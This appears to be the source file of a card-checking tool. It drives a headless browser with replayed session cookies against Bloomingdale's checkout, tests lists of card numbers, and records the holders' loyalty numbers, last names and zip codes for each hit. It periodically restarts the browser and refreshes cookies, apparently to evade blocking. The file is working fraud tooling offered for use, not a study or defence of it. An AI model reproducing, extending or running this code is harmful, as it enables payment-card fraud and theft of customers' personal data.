const puppeteer = require('puppeteer');
const fs = require('fs');
const Datastore = require('nedb')
const checkCardNumberHelper = require('../helper/bloom/checkCard');
const utilsHelper = require('../helper/utils');
const cardNumberDb = new Datastore({
    filename: 'database/cardNumber.db',
    autoload: true
});

const autoSave = () => {
    cardNumberDb.find({success : true}, {"_id": 0,"cardNumber": 0,"success" : 0,"checked" : 0}, (err, doc) => {
        let output = '';
        doc.forEach(element => {
            if (element.loyaltyNumber)
            output += Object.values(element).join('|') + "\n";
        });

        let stream = fs.createWriteStream("cardNumber.txt");

        stream.once('open', function(fd) {
            stream.write(output);
            stream.end();
        });
    });
}
autoSave()
setInterval(autoSave,10000);



window.onload = () => {

    cardNumberDb.find({success : true}, {"_id": 0,"cardNumber": 0,"success" : 0,"checked" : 0}, (err, doc) => {
        let listOuputRestore = '#listOuputRestore';
        doc.forEach(element => {
            if (element.loyaltyNumber)
            $(listOuputRestore).append(Object.values(element).join('|') + "\n");
        });
    });

    document.querySelector('#btnStart').addEventListener('click', async () => {

        let cookiesJson = $("#listInputCookie").val();
        
        if (!utilsHelper.IsJsonString(cookiesJson)) {
            alert("Cookie not Json");
            return false;
        }

        let showBrowser = $('#checkboxShowBrowser').is(":checked");
        if (showBrowser) showBrowser = false 
        else showBrowser = true

        let buttonElement = '#btnStart';
        let buttonDefaultText = $(buttonElement).text();

        $(buttonElement).html('<i class="fa fa-spinner fa-spin" style="font-size:20px"></i> Proccessing..');
        $(buttonElement).prop("disabled", true);

        let elementOutput = "#listOuput";
        let elementproccessingAll = "#proccessingAll";
        let elementproccessingCurrent = "#proccessingCurrent";


        let cookies = JSON.parse($("#listInputCookie").val());
        let listCardNumber = $("#listInputMain").val().trim().replace(/^\s*\n/gm, "").split('\n');

        $(elementOutput).text('');
        $(elementproccessingCurrent).text(0);
        $(elementproccessingAll).text(listCardNumber.length);

        let modePuppeteer = {
            headless: showBrowser,
            executablePath : utilsHelper.getChromiumExecPath()
        };

        let browser = await puppeteer.launch(modePuppeteer);
        let page = (await browser.pages())[0];

        await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36");

        await page.setCookie(...cookies);

        let countCheckCard = 1;
        await page.setViewport({
            width: 1366,
            height: 768
        });

        await page.goto("https://www.bloomingdales.com/chkout/rcsignedin?perfectProxy=true").catch(() => {

        });
        
        let lastCookies = await page.cookies();

        await utilsHelper.asyncForEach(listCardNumber, async (cardNumber) => {
   
            let cardNumberSaved = await new Promise((resolve, reject) => {
                cardNumberDb.find({
                    cardNumber: cardNumber
                }, {
                    "_id": 0
                }, (err, doc) => {
                    resolve(doc)
                });
            });

    
            let resultCheckCard = {};

            if (await !cardNumberSaved[0]) {

                if (countCheckCard && countCheckCard % 20 == 0) {
                    console.log("Refresh browser");
                    await page.close();
                    await browser.close();
                    browser = await puppeteer.launch(modePuppeteer);
                    page = (await browser.pages())[0];

                    await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36");

                    await page.setCookie(...cookies);

                    await page.setViewport({
                        width: 1366,
                        height: 768
                    });

                    await page.goto("https://www.bloomingdales.com/chkout/rcsignedin?perfectProxy=true").catch(() => {

                    });
                    console.log("Refresh browser success");
                }
                
                if (countCheckCard && countCheckCard % 40==0) {
                    console.log("Save cookie");
                    lastCookies = await page.cookies();
                    console.log("Save cookie success");
                }
                
                resultCheckCard = await checkCardNumberHelper.checkCard(page, cardNumber);
                if (resultCheckCard.checked)
                    cardNumberDb.insert(resultCheckCard);

                countCheckCard++;
            } else {
                resultCheckCard = await cardNumberSaved[0];
            }

            if (await resultCheckCard.success && await resultCheckCard.loyaltyNumber) {
                let dataExport = {
                    loyaltyNumber: resultCheckCard.loyaltyNumber,
                    lastName: resultCheckCard.lastName,
                    zipCode: resultCheckCard.zipCode,
                }

                $(elementOutput).append(Object.values(dataExport).join('|') + "\n");
            }

            $(proccessingCurrent).text(Number($(elementproccessingCurrent).text()) + 1);
        })

        await browser.close();

        $(buttonElement).removeAttr('disabled');
        $(buttonElement).hide().text(buttonDefaultText).fadeIn();

    })
};